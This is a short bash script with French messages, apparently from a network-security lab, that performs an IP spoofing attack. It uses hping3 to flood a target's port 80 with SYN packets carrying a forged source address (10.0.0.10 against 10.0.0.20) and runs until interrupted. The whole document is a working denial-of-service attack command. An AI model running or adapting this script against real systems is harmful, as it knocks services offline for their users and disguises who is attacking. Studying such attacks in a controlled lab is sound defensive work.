#!/bin/bash

echo "=== IP Spoofing Attack ==="
echo "Objectif: Usurper une adresse IP"

FAKE_IP="10.0.0.10"
TARGET_IP="10.0.0.20"
INTERFACE="eth0"

echo "Envoi de paquets avec IP usurpee..."
echo "Utilisation de hping3..."

hping3 -a $FAKE_IP -S -p 80 --flood $TARGET_IP &

echo "Attaque en cours (utilisez Ctrl+C pour arreter)..."
wait
